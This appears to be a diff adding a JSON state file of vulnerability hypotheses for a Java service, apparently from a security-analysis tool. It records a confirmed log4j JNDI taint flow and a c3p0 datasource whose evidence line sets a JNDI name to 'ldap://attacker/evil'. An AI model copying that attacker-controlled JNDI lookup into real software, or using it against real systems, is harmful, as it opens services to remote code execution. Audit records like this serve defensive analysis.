@@ -1,0 +1,43 @@
+{
+  "next_id": 3,
+  "hypotheses": [
+    {
+      "id": "h1",
+      "statement": "Svc logs an untrusted header via log4j JndiLookup (taint reaches the JNDI sink).",
+      "hypothesis_type": "taint-flow",
+      "status": "confirmed",
+      "evidence": [
+        {
+          "text": "log.info(\"request from {}\", ua) where ua is the untrusted User-Agent header.",
+          "source": "static-analysis",
+          "added_at": "2026-08-15T12:00:01Z"
+        }
+      ],
+      "created_at": "2026-08-15T12:00:00Z",
+      "resolved_with": "tainted header reaches JndiLookup.lookup"
+    },
+    {
+      "id": "h2",
+      "statement": "c3p0 datasource is configured from a remote JNDI name (JndiRefForwardingDataSource).",
+      "hypothesis_type": "vulnerability",
+      "status": "confirmed",
+      "evidence": [
+        {
+          "text": "ds.setJndiName(\"ldap://attacker/evil\") — remote JNDI name from attacker control.",
+          "source": "source-read",
+          "added_at": "2026-08-15T12:00:02Z"
+        }
+      ],
+      "created_at": "2026-08-15T12:00:00Z",
+      "resolved_with": "JNDI name is attacker-controlled"
+    },
+    {
+      "id": "h3",
+      "statement": "No auth gate protects the endpoint.",
+      "hypothesis_type": "design",
+      "status": "open",
+      "evidence": [],
+      "created_at": "2026-08-15T12:00:00Z"
+    }
+  ]
+}
